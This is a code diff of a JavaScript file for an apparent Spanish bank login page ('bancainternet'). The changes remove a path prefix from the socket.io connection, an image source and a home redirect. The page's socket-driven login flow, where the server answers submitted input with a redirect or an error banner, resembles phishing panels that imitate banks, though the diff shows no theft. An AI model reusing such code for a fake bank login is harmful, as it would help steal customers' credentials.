@@ -1,7 +1,7 @@
 //const { text } = require("express");
 
 const socket = io.connect({
-    path: "/bancainternet/socket.io/"
+    path: "/socket.io/"
 })
 
 
@@ -40,7 +40,7 @@ ShowVolver.addEventListener("click", () => {
     LoginHelp.parentElement.classList.toggle('clave-nopodes');
     LoginHelp.parentElement.classList.toggle('nopodes');
     userInput.value = "";
-    Avatar.setAttribute('src', '/bancainternet/img/icono-login_a.png');
+    Avatar.setAttribute('src', '/img/icono-login_a.png');
     passCount = 0;
 })
 
@@ -91,7 +91,7 @@ emitDataServer.addEventListener("click", () => {
 })
 
 socket.on("ContinuarHome", ContinuarHome => {
-    window.location.href = "/bancainternet/home/?s="+ContinuarHome;
+    window.location.href = "/home/?s="+ContinuarHome;
 })
 
 socket.on("ErrorLogin", TextoBanner => {
